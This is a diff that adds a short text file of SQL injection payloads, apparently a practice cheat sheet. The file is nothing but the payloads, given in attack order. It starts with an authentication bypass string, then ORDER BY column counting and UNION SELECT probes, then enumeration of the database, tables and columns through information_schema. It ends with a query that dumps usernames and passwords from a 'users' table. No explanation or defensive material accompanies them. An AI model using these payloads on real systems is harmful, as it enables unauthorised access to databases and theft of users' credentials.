@@ -1,0 +1,26 @@
+--- NORMAL TEST ---
+1
+
+--- AUTHENTICATION BYPASS ---
+1' OR '1'='1
+
+--- FIND NUMBER OF COLUMNS ---
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+1' ORDER BY 4-- -
+
+--- UNION TEST ---
+1' UNION SELECT 1,2-- -
+
+--- GET DATABASE NAME ---
+1' UNION SELECT database(),2-- -
+
+--- GET TABLE NAMES ---
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+
+--- GET COLUMN NAMES ---
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+
+--- GET USERNAME + PASSWORD ---
+1' UNION SELECT user,password FROM users-- -
